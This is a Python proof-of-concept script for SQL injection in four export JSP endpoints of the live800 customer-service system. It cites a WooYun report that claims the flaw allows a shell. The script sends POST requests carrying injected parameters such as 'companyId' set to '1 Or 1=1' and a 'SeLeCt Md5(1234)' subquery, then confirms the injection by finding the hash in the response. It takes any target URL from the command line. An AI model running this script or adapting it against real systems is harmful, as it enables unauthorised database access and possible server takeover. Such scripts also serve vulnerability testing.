#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800在线客服系统多处SQL注入/GETSHELL漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0177871
author: Lucifer
description: http://domain/sta/export/referrerSta.jsp，
             http://domain/sta/export/chatTopicSta.jsp，
             http://domain/sta/export/chatHoursSta.jsp，
             http://domain/sta/export/chatUrlSta.jsp。四处存在SQL注入漏洞，可GETSHELL。
'''
import sys
import json
import requests



class live800_sta_export_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Referer":self.url + "/live800/sta/referrerTypeSta.jsp",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate"
        }
        turl = "/live800/sta/export/referrerSta.jsp"
        vulnurl = self.url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_referrer",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4)

        except:
            return "[-]connect timeout"

        headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate"
        }

        turl = "/live800/sta/export/chatTopicSta.jsp"
        vulnurl = self.url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_topic",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4)

        except:
            return "[-]connect timeout"

        turl = "/live800/sta/export/chatHoursSta.jsp"
        vulnurl = self.url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_close_reason",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4)

        except:
            return "[-]connect timeout"

        turl = "/live800/sta/export/chatUrlSta.jsp"
        vulnurl = self.url + turl
        payload = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_url",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        try:
            req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(payload, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = live800_sta_export_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
